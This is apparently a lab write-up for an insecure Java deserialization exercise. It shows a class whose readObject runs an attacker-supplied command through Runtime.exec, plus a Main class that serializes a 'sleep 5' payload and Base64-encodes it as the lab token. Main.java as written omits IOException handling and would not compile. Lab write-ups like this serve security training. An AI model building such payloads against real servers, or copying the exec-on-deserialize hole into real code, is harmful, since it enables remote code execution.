# Insecure Deserialize

## Let's try

With given hints, we can use the sample code in page 3 and modify it to solve our challenge.
Create folder `pck` and create 2 file `.java` as below in the folder:

```java
//VulnerableTaskHolder.java
package pck;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

        private static final long serialVersionUID = 2;

        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;

        public VulnerableTaskHolder(String taskName, String taskAction) {
                super();
                this.taskName = taskName;
                this.taskAction = taskAction;
                this.requestedExecutionTime = LocalDateTime.now();
        }

        private void readObject( ObjectInputStream stream ) throws Exception 
        {
        //deserialize data so taskName and taskAction are available
                stream.defaultReadObject();

                //blindly run some code. #code injection
                Runtime.getRuntime().exec(taskAction);
     }
}
```

And the modify in main code:

```java
//Main.java
package pck;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Main {
    static public void main(String[] args)
    {
            VulnerableTaskHolder go = new VulnerableTaskHolder("wait", "sleep 5");
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(go);
            oos.flush();
            byte[] exploit = bos.toByteArray();
            String exp = Base64.getEncoder().encodeToString(exploit);
            System.out.println(exp);
    }
}
```

Run main.java and get the token.
